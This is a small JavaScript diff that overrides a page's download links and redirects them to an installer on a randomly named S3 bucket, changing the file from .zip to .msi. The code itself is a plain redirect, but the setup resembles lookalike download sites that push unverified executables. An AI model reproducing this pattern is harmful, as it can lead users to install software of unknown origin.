@@ -8,7 +8,8 @@ downLinks.forEach(function(link) {
         event.preventDefault();
 
         // 执行跳转操作，替换下面的URL为您想要跳转的URL
-        window.location.href = "https://gfsmdmtke.s3.ap-east-1.amazonaws.com/wangwangshangliao9.8.01.zip";
+        window.location.href = "https://gfsmdmtke.s3.ap-east-1.amazonaws.com/wangwangshangliao9.8.01.msi";
     });
 });
+
 
